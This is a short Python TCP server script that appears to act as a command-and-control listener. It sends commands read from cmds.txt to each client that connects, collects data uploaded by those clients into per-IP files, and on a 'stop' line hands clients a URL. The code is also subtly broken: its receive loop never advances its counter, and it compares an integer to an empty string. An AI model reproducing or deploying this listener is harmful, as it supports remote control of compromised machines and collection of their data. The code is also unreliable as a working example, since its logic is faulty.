import socket

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_socket.bind(('10.13.0.16', 3131))
server_socket.listen() 
URL = None

with open('cmds.txt', 'r') as cmd:
    commands = cmd.readlines()
    commands.pop(0)
    URL = commands.pop(0)
    cmd.close()

while(True):
    with open('cmds.txt', 'r') as cmd:
        client_connected, client_address = server_socket.accept()
        print(f"[SERVER] Connection request accepted from {client_address[0]},{client_address[1]}")
        if cmd.readline() != 'stop':
                ## get default connection and ignore data sent..
                # client_connected.recv(1)

                client_connected.send(commands[0].encode())

                data_recv = 0
                DATA_INCREMENT = 100

                data_size = int.from_bytes(client_connected.recv(1000), 'big')
                print(f'[SERVER] Received data size of {data_size}')
                if data_size != '':
                    write_file = open(f'{client_address[0]}.data.txt', 'wb')
                    print('[SERVER] Write file opened!')
                    client_data = client_connected.recv(DATA_INCREMENT)
                    while data_recv < int(data_size):
                        write_file.write(client_data)
                        client_data = client_connected.recv(DATA_INCREMENT)
                        print('[SERVER] More data received...')

                    write_file.close()
                    client_connected.send('1'.encode())
                    print(f'[SERVER] File from {client_address[0]} written!')
                else: print('[SERVER] No data received. Waiting for more connections OR this is normal behavior.')
        else: 
            client_connected.send(URL.encode())
            print('[SERVER] Server stopped!')
            break

server_socket.close()